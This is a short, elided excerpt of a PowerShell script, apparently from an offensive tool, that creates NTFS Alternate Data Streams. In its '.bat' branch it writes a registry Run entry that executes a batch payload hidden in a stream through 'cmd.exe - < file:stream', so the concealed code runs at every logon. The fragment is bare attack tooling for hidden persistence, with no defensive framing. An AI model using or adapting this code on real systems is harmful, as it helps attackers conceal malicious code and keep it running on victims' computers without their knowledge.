...
ElseIf($ADS -ieq "Create")
{
    ...
    ElseIf($ParseDataName -Match '.bat$')
    {
        ...
        If($Registry -ieq "True")
        {
           Write-Host "`n* Registry persistence settings *"
           #Add to registry RUN the stream execution cmdline
           New-ItemProperty -Path "$path1" -Name "$StreamName" -Value "cmd /R `"cmd.exe - < ${InTextFile}:${StreamName}`"" -PropertyType String -Force|Select-Object $StreamName,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
